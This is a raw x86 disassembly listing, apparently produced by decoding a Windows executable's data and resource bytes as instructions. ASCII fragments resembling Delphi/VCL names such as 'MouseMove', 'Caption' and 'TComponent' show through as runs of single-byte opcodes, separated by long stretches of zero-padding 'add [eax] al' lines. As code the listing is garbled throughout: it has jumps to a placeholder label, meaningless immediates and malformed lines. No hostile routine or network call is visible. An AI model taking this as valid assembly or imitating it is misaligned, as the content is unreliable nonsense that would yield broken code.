add [ eax - 0x80000000 ] al
add [ ecx ] cl
pop edi
inc ecx
add al bh
add [ eax ] al
outsb
dec ebp
outsd
jne r-xdata
or [ ebp ] eax
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ fs : ebx ] cl
dec edi
loopne r-xdata
inc esp
outsd
ja r-xdata
or [ ebp ] eax
cwde
or al [ ebp ]
loopne r-xdata
outsb
dec ecx
outsb
outsw
push esp
imul esi [ eax - 0x24 ] 0x600043dd
add eax [ eax ]
jmp [ eax + 0x3 ]
add [ eax ] al
sbb [ edi ] 0x9
dec edi
lodsb [ esi ]
loop r-xdata
insd
loop r-xdata
mov esp 0x1000450b
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b006a ] al
outsb
push ebp
jo r-xdata
popad
add [ eax + 0x3 ] ch
add bh bh
push 0x1ff0003
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0068 ] al
outsb
push ebx
call 0xffffffffd8443e66
add [ eax ] al
les ecx [ 0x1000045 ]
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul eax [ eax ] 0x536e4f0b
je r-xdata
dec ebp
outsd
jbe r-xdata
jmp eax
add bh bh
loopne r-xdata
dec edi
add al bh
add al [ eax ]
add [ edx + ecx * 2 + 0x45 ] bl
jb r-xdata
dec edi
add [ eax ] al
and [ esi ] 0x9
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
sbb eax [ edx ]
call 0xffffffff9c443cc0
dec eax
inc ebp
add al ah
push ds
inc edx
add [ eax - 0x80 ] al
inc ebp
add [ ebx + ebx + 0x42 ] bh
add [ eax - 0x57ffbab7 ] dh
mov ebx 0x4a5c0043
inc ebp
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx - 0x44 ] bp
or eax [ ebp ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push 0x0
or ecx [ edi + 0x6e ]
xor al 0x40
jb r-xdata
insb
arpl [ gs : ecx + ecx * 2 + 0x74 ] si
insd
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0062 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
bound eax [ eax ]
or cl [ edi + 0x6e ]
add [ eax ] al
add [ ebx + edi * 8 + 0x43 ] bh
add [ eax + eax ] cl
add [ eax ] al
sub [ edx + 0x40 ] dh
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
adc al 0x45
inc ebx
outsd
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
inc ebx
loopne r-xdata
inc esp
jb r-xdata
outsb
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090066 ] al
inc ebp
add al ah
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ gs : ebx ] cl
jb r-xdata
inc eax
add [ ecx + esi + 0x31a00040 ] al
jb r-xdata
jl r-xdata
inc esi
add [ eax ] dl
dec ecx
inc ebp
add [ eax ] cl
pop ds
inc esi
add [ eax + eax * 4 + 0x45 ] ah
add [ eax + 0x4400454a ] cl
dec ecx
inc ebp
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ ecx + ecx * 2 + 0x45 ] bh
add [ ebx ] bl
inc edx
add [ ebx + ebx + 0x1be80042 ] dl
inc edx
add [ eax + ecx * 2 + 0x1ee00045 ] bl
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
test dl bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 8 ] bl
inc ebx
add [ eax ] ch
add [ eax ] al
add [ esi + ebp * 4 ] ch
inc ebx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] cl
add [ eax ] al
inc [ ecx ]
add [ ecx ] cl
push esp
js r-xdata
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
outsd
jb r-xdata
inc esp
add [ ebx ] dl
push esp
dec esp
add [ eax + ebp * 4 - 0x57dbffbc ] bl
add [ edi + ebx + 0x49d80046 ] dl
inc ebp
add [ edi + ebx + 0x49f80046 ] bl
inc ebp
add [ edi + ebx - 0x7f93ffba ] ah
inc ebp
add ah ch
dec edx
inc ebp
add [ ebx + ecx * 2 ] ch
inc ebp
add [ eax ] bl
dec edx
inc ebp
add [ eax - 0x43ffb9e1 ] bh
pop ds
inc esi
add [ edx + ecx * 2 ] bh
inc ebp
add [ edi + eax * 2 - 0x4497ffbb ] ch
inc ebx
add ah ch
mov ebx 0xbb7c0043
inc ebx
add ah dl
test al 0x44
add al ah
mov ebp 0xa89c0043
inc esp
add [ eax + ebp * 4 ] ah
inc ebp
add [ eax ] al
jmp eax
dec esp
or al [ ebp ]
call 0xffffffffe942f91a
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070063 ] al
outsb
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
sub [ edx ] eax
adc [ eax ] al
add bh bh
jo r-xdata
add ah bh
inc edx
add [ eax ] dl
add [ eax ] al
push [ eax - 0x7a ]
inc ebx
popad
insb
inc ebx
imul esi [ ebx + 0x74 ] 0x77656956
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc eax
add al ah
sti
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
sti
jae r-xdata
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
outsd
insb
push 0x436c6143
inc ebx
add [ edi ] al
inc esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xff0000 ] al
add [ ecx ] cl
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
sub [ edx ] eax
adc al 0x0
add bh bh
jo r-xdata
push esp
imul esi [ esp + ebp * 2 + 0x65 ] 0x6b636142
inc ebx
outsd
add bh bh
add al [ eax ]
push cs
loopne r-xdata
je r-xdata
popad
jns r-xdata
add al [ eax ]
sub [ edx ] eax
sbb al 0x0
add bh bh
jo r-xdata
add ah al
xchg esp eax
inc ecx
add [ ebp + eax * 4 + 0x44 ] ah
add [ edi ] cl
push esp
dec ebp
outsd
outsb
je r-xdata
sub [ edx ] eax
or al 0x0
add bh bh
jo r-xdata
sub [ edx ] eax
or [ eax ] al
add bh bh
jo r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add bh bh
outsd
jb r-xdata
inc ebx
add al bh
inc cx
add [ esi ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
dec ecx
outsb
or esp [ edi + ebp * 2 + 0x77 ]
push esp
outsd
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
inc [ edx ]
add [ esi ] cl
inc esp
add [ ecx ] al
add [ eax ] al
add [ 0x13000000 ] al
add [ eax ] al
inc [ 0x72541100 ]
popad
imul ebp [ ecx + ebp * 2 + 0x6e ] 0x78655467
je r-xdata
inc eax
add [ ebx + edx * 4 - 0x6b43ffbf ] ch
inc ecx
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
inc ebx
add [ eax ] ah
add [ eax ] al
add [ esi + 0x34340041 ] al
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
insb
outsd
jb r-xdata
insb
jae r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ edi + eax * 4 + 0x44 ] al
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 8 ] dh
outsb
je r-xdata
or esp [ edi + ebp * 2 + 0x77 ]
push ebx
outsd
ja r-xdata
inc edi
je r-xdata
outsb
jae r-xdata
outsb
outsd
insb
outsd
jb r-xdata
add [ eax ] al
push [ eax - 0x7a ]
add [ eax + 0x8004229 ] bl
rcl [ ebp + eax * 2 + 0x44892800 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] dl
mov [ eax + eax + 0x14 ] al
mov [ eax + eax + 0x20 ] al
sub al [ eax ]
les ecx [ ecx + 0x2a200044 ]
inc eax
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ edi ] cl
push esp
inc ebx
outsd
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
add ecx [ eax ]
push es
popad
jb r-xdata
jb r-xdata
inc ebx
add [ eax + 0x2 ] dl
add [ eax ] al
fcom [ edi ]
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
adc [ eax ] al
xchg esp eax
adc [ eax ] al
lea eax [ eax ]
push eax
inc [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
push ebx
outsb
jb r-xdata
or [ esi ] al
popad
jns r-xdata
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
inc eax
add [ edi * 8 + 0xd030043 ] bl
push esp
inc ebx
popad
insb
inc esp
popad
jns r-xdata
add [ eax ] al
add [ edi + edi * 8 + 0xc0043 ] bh
add [ eax ] al
xor bl bh
inc ebx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc [ ebx ]
pop es
andps xmm0 [ ebx + 0x6f ]
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ 0x746e6f4d ] al
push 0x72614308
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc ecx
add [ eax ] cl
jpo r-xdata
mov [ esi - 0x6c27ffbb ] dl
imul ebp [ esi + 0x61 ] 0x1174006c
inc eax
outsd
outsb
je r-xdata
dec ebp
popad
jns r-xdata
jb r-xdata
popad
jns r-xdata
or [ edi + ebp * 2 + 0x77 ] esp
inc esi
outsd
ja r-xdata
popad
je r-xdata
push di
imul eax [ gs : ecx ] 0x0
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax ] bl
std
inc ebx
add [ ecx ] cl
outsd
ja r-xdata
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
inc ebx
popad
insb
inc ebp
jb r-xdata
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
push cs
inc ebp
dec ebp
outsd
outsb
je r-xdata
inc [ ebx ]
mov [ ebx ] ds
inc ebp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
add al ah
xchg [ eax + eax + 0x54 ] eax
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
jb r-xdata
inc edx
outsd
insb
dec ecx
outsb
outsw
or [ ebx + 0x61 ] al
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x34 ] cl
inc eax
or [ ebx + 0x61 ] al
adc [ edi + ebp * 2 + 0x77 ] ah
outsd
ja r-xdata
xor al 0x40
dec eax
imul ebp [ esi + 0x61 ] 0x4d0d016c
or [ edi + ebp * 2 + 0x77 ] esp
push ebx
outsd
ja r-xdata
outsw
inc ebp
jbe r-xdata
push 0x64737275
popad
jns r-xdata
dec esp
outsd
outsb
popad
jns r-xdata
rcl [ ebp + eax * 2 + 0x44892800 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
add [ edi * 2 + 0x581c0045 ] al
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax + 0x68004491 ] ch
leave
inc ebp
add [ esp + edx * 4 - 0x6cc7ffbc ] bl
inc esp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
outsd
jb r-xdata
and [ ecx ] al
inc esp
add [ eax ] al
insb
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] cl
inc ebx
add [ eax ] al
inc eax
add [ eax - 0x2 ] dl
je r-xdata
inc ebx
popad
jne r-xdata
add [ eax + edx + 0x10940040 ] dl
inc eax
add [ ebp - 0x1afffc0 ] cl
outsb
popad
insb
add [ ecx + edx + 0x40 ] dh
popad
jns r-xdata
arpl [ eax + eax + 0x5 ] si
dec ebp
outsd
outsb
je r-xdata
push 0x65
ja r-xdata
or al 0x64
outsd
outsd
add eax [ eax ]
inc ebx
popad
insb
outsb
popad
jb r-xdata
insd
inc ebx
je r-xdata
add [ ebx + ebx + 0xb0045 ] cl
or [ ebx + 0x6f ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
add [ eax + eax + 0xa ] al
add [ eax + eax + 0x50 ] eax
add al [ eax ]
add [ esi + edi * 8 ] al
inc ebx
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add al ah
xchg [ eax + eax + 0x54 ] eax
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
sbb [ eax ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
add [ eax + eax ] eax
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + 0x43ffbcc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebx
outsd
insd
or [ ebx + 0x6f ] al
outsd
ja r-xdata
inc ebx
je r-xdata
jne r-xdata
jmp [ edx + ecx * 4 + 0x44 ]
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] dl
mov [ eax + eax + 0x14 ] al
mov [ eax + eax - 0x14 ] al
xchg ebx eax
inc esp
add ah al
mov [ eax + eax - 0xc ] eax
xchg ebx eax
inc esp
add [ eax ] ch
xchg esp eax
inc esp
add [ esp + edx * 4 + 0x44 ] ah
add [ edx ] al
add [ esi ] cl
mov al 0x4e
mov esp sub_449200
sub [ edx + 0x540e0044 ] dl
dec ebp
outsd
outsb
je r-xdata
add [ eax - 0x76 ] cl
inc ebp
add al ch
xchg edi eax
inc ebp
add [ eax - 0x2fffbb6d ] ah
xchg esp eax
inc ebp
add [ eax ] ch
mov [ eax + eax - 0x80 ] eax
cwde
inc ebp
add [ eax + ebx * 4 - 0x68c3ffbb ] al
inc eax
add [ eax ] ah
add [ eax + eax + 0x7 ] eax
push cs
push esp
dec ebp
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
dec eax
inc [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xff
insb
jae r-xdata
imul ebp [ fs : esi + 0x61 ] 0x4d0d016c
outsd
arpl [ ecx + 0x6c ] sp
inc esp
popa
jne r-xdata
outsb
jae r-xdata
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
jmp [ eax + 0x10045c4 ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410800
je r-xdata
add [ eax ] al
inc ebx
popad
insb
outsb
popad
jb r-xdata
ja r-xdata
std
inc ebx
add [ eax ] cl
adc al 0x54
dec edi
outsb
jpe r-xdata
mov ah 0x8
inc ebp
add [ eax + eax ] dh
jmp [ eax ]
pop ebx
add [ eax ] al
jmp [ eax + 0x4f ]
add [ eax + eax + 0x44 ] al
inc [ ebx ]
cmp al [ eax ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
les eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
jae r-xdata
add [ eax + 0x430b0011 ] al
outsd
jb r-xdata
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add al bl
add [ ebp ] al
add bh bh
mov eax 0x800448b
mov al [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x45070018 ] al
outsb
inc esp
popad
je r-xdata
jb r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or eax [ ebx + 0x6f ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jo r-xdata
dec ebp
outsd
je r-xdata
sbb ch bh
inc ebx
add [ eax ] ah
add al [ eax ]
inc [ eax - 0x74 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
inc esi
imul esi [ edx + 0x73 ] 0x79614474
dec edi
push di
imul edi [ gs : eax ] 0x2e
inc edx
add [ eax ] ch
add bh bh
inc eax
add [ edi ] dl
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov eax 0x18004507
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
pop es
inc ebp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + eax ] al
dec [ edi + ecx * 4 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or ecx [ ebp + 0x75 ]
insb
je r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xfc65646f
sti
inc ebx
add [ eax ] cl
add al [ eax ]
sbb al 0x0
pop es
dec ecx
insd
dec esi
popad
insd
mov eax 0x28004507
add al [ eax ]
[ eax + 0x1000448c ]
inc ebp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4907001c ] al
pop ebx
inc ebp
add [ eax + 0x5b ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
outsd
outsb
je r-xdata
push 0x40ff0000
adc eax 0x1840045
add bh bh
test [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
sbb eax [ eax ]
pop es
dec ecx
insd
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec ebx
push ebx
insb
arpl [ gs : eax + edi * 4 + 0x7 ] si
inc ebp
add [ eax - 0x76 ] cl
inc esp
add [ eax - 0x76 ] bh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44040013 ] al
popad
je r-xdata
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
rol [ eax ] 0x45
add [ edx ] bh
add bh bh
sub_43d728
insb
aad 0x43
add al cl
sub al 0x44
add ah bh
sub al 0x44
add ah dh
sub al 0x44
add [ eax ] al
add [ eax ] al
xor [ edx ] 0x0
add [ eax ] al
pop es
add [ 0x74646957 ] al
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom st7
inc ebx
add [ eax ] al
add [ eax ] al
push esp
inc ecx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x67 ] ah
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
add ah cl
cdq
inc ecx
add [ eax ] bh
sahf
inc ecx
add [ esi + ebx * 4 ] bh
inc ecx
add [ eax - 0x62 ] al
inc ecx
add ah dh
popfd
inc ecx
add [ esi + ebp - 0x659bffbc ] bh
inc ecx
add al ah
0x10041 0xffff
mov eax 0xc00442e
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x756c6f43
insd
outsb
jae r-xdata
xlat
inc ebx
add [ ecx + ebp * 2 + 0x41 ] cl
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + edx * 8 - 0x283bffbd ] bh
inc ebx
add [ eax + eax ] bl
add [ eax ] al
loopne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x756c6f43
insd
outsb
jae r-xdata
inc eax
add al bl
xlat
inc ebx
add [ edi ] al
or al 0x54
imul esi [ ebx + 0x74 ] 0x6d657449
insb
jae r-xdata
inc ecx
add ah al
xchg esp eax
inc ecx
add [ ecx + edi + 0x44 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
and al 0x0
add [ eax ] al
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
inc ebx
add [ edi ] al
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
fadd [ ebx ]
je r-xdata
mov esp 0xc4004194
dec ecx
je r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
jae r-xdata
dec ecx
je r-xdata
xchg esp eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x28 ] ah
inc ebx
add [ eax + eax ] ch
add [ eax ] al
test [ esi + 0x41 ] ah
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ esp + esi - 0x6b43ffbc ] bh
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
cld
fadd [ ebx ]
pop es
or dl [ esp + ecx * 2 + 0x69 ]
jae r-xdata
aas
test [ ecx ] dh
inc eax
add [ eax + 0x48004031 ] ah
cmp eax [ eax + eax - 0x44 ]
xchg esp eax
inc ecx
je r-xdata
insd
add ah al
insd
dec eax
fadd [ ebx ]
clc
inc cx
add [ eax ] al
je r-xdata
insb
jae r-xdata
add [ eax ] ah
xor [ eax + eax - 0x4c ] al
cwde
inc ecx
add ah ah
cwde
inc ecx
add [ eax + esi ] dh
inc esp
add ah bl
das
inc esp
dec ecx
xor al 0x40
je r-xdata
inc esp
add ah dl
add al ah
fadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
fadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
fadd [ ebx ]
adc [ eax ] al
add [ eax ] al
test [ esi + 0x41 ] ah
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x3b ] cl
inc esp
add [ esp + edx * 4 + 0x3fc40041 ] bh
add [ eax + 0x60004031 ] ah
cdq
inc ecx
jb r-xdata
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
add al bl
xchg ebx eax
inc ecx
insd
jae r-xdata
fiadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xdb
inc ecx
jb r-xdata
test [ ecx ] dh
inc eax
popad
lodsb [ esi ]
fld [ ebx ]
pop es
or [ edi + edx * 2 + 0x6f ] edx
jb r-xdata
inc esp
add [ edx ] cl
push esp
dec esp
fadd [ ebx ]
clc
inc cx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
jb r-xdata
imul ebp [ edi + 0x6e ] r-xdata
sbb al 0xdb
inc ebx
add [ edi ] al
inc eax
add ah bh
popad
jae r-xdata
inc ecx
add ah cl
cdq
inc ecx
add [ eax ] bh
sahf
inc ecx
add [ esi + ebx * 4 ] bh
inc ecx
add [ eax - 0x62 ] al
inc ecx
add ah dh
popfd
inc ecx
add [ eax + esi + 0x44 ] dh
add [ edx + ebx * 4 + 0x41 ] ah
inc ecx
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
